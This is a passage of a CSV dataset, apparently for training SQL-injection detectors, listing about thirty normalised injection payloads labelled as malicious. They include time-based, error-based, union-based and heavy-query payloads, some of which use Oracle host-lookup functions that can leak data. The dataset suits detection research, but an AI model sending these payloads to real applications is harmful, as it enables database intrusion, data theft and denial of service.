row_index,payload_norm,label,sqli_type_hint
5970,select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --,1,
5971,"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,1,
5972,1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--,1,
5973,-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,1,
5974,select ( case when ( 4935 = 4734 ) then 4935 else 4935* ( select 4935 from mysql.db ) end ) #,1,
5975,"-9840 ) ) as thod where 4790 = 4790 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
5976,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",1,
5977,"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
5978,"1%"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,1,
5979,"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",1,
5980,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg",1,
5981,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",1,
5982,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'zpkv' = 'zpkv",1,
5983,"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
5984,"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1,
5985,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,1,
5986,"1"" ) as ivkw where 4218 = 4218 union all select null--",1,
5987,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,1,
5988,"1"" ) where 2088 = 2088 union all select null,null,null,null--",1,
5989,"-2230%"" union all select 3303,3303,3303--",1,
5990,"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5991,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",1,
5992,select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,1,
5993,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",1,
5994,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',1,
5995,"1%"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,1,
5996,1' where 9242 = 9242,1,
5997,"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",1,
5998,"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
5999,"-5235 ) or make_set ( 9354 = 9354,7185 )",1,
